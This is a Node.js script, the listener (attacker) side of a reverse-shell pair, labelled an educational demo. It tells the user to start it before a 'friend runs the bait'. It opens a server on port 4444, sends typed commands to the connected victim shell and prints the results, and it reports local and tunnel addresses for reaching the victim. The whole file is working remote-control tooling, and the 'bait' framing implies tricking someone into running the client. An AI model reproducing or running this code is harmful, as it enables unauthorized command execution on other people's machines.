// ============================================================
//  LISTENER (your machine) — Educational Reverse Shell Demo
//  Run this FIRST on YOUR computer before your
//  friend runs the bait.
//
//  Usage: node rs_listener.js
//  To close: Ctrl+C in this terminal
// ============================================================

const net = require('net');
const readline = require('readline');
const PORT = 4444;

let currentSocket = null;

function getPayloadTarget() {
    try {
        const lines = require('fs').readFileSync(
            require('path').join(__dirname, '.last_target'), 'utf-8').trim().split('\n');
        if (lines.length >= 2) {
            return { ip: lines[0], port: parseInt(lines[1]) || null };
        }
    } catch {}
    return { ip: null, port: null };
}

const server = net.createServer(socket => {
    currentSocket = socket;
    console.log('\x1b[32m[+] Connection received from:', socket.remoteAddress + '\x1b[0m');
    console.log('\x1b[33m[!] You can now type commands. Type exit to close.\x1b[0m');
    console.log('\u2500'.repeat(50));

    // Read lines from keyboard and send to client
    const rl = readline.createInterface({ input: process.stdin, terminal: false });
    rl.on('line', line => {
        if (socket.writable) {
            socket.write(line + '\n');
            if (line.trim().toLowerCase() === 'exit') {
                socket.end();
            }
        }
    });

    // Display what the friend's shell responds
    socket.setEncoding('utf-8');
    socket.on('data', data => process.stdout.write(data));

    function shutdown(reason) {
        console.log('\n\x1b[31m' + reason + '\x1b[0m');
        console.log('\x1b[31m[-] Closing connection.\x1b[0m');
        rl.close();
        if (!socket.destroyed) socket.destroy();
        currentSocket = null;
        server.close(() => {
            console.log('\x1b[31m[*] Listener closed.\x1b[0m');
            process.exit(0);
        });
        setTimeout(() => process.exit(0), 1000);
    }

    socket.on('end', () => shutdown('[-] Connection closed by the client.'));

    socket.on('error', err => {
        if (err.code !== 'ECONNRESET') {
            console.error('\x1b[31m[!] Error:', err.message + '\x1b[0m');
        }
        shutdown('[-] Connection closed by the client.');
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log('\x1b[36m\u2554' + '\u2550'.repeat(40) + '\u2557');
    console.log('\u2551  REVERSE SHELL LISTENER \u2014 Demo         \u2551');
    console.log('\u255a' + '\u2550'.repeat(40) + '\u255d\x1b[0m');
    console.log(`\x1b[33m[*] Listening on port ${PORT}...`);
    console.log('[*] Waiting for client to connect...\x1b[0m');
    console.log('');
    console.log('Connection:');
    const { ip: targetIp, port: targetPort } = getPayloadTarget();
    const dgram = require('dgram');
    const s = dgram.createSocket('udp4');
    s.connect(80, '8.8.8.8', () => {
        const ip = s.address().address;
        s.close();
        console.log(`  \x1b[32mLocal IP : ${ip}\x1b[0m`);
        if (targetIp && targetIp !== ip && targetIp !== '127.0.0.1' && targetIp !== 'localhost') {
            const portStr = targetPort ? `:${targetPort}` : '';
            console.log(`  \x1b[32mTunnel   : ${targetIp}${portStr} \u2192 ${ip}:${PORT}\x1b[0m`);
        } else {
            console.log(`  \x1b[32mListener : ${ip}:${PORT}\x1b[0m`);
        }
        console.log('');
    });
    s.on('error', () => {
        s.close();
        console.log('  \x1b[31mNo network connection\x1b[0m');
        console.log('');
    });
});

server.on('error', err => {
    if (err.code === 'EADDRINUSE') {
        console.error(`\x1b[31m[!] Port ${PORT} is already in use. Close the process that is using it.\x1b[0m`);
    } else {
        console.error('\x1b[31m[!] Error:', err.message + '\x1b[0m');
    }
    process.exit(1);
});

// Handle Ctrl+C — clean shutdown with visible message
process.on('SIGINT', () => {
    console.log('\n\x1b[31m[-] Closing connection.\x1b[0m');
    if (currentSocket && !currentSocket.destroyed) {
        currentSocket.destroy();
    }
    server.close(() => {
        console.log('\x1b[31m[*] Listener closed.\x1b[0m');
        process.exit(0);
    });
    // If server.close takes too long, force exit after 1s
    setTimeout(() => process.exit(0), 1000);
});
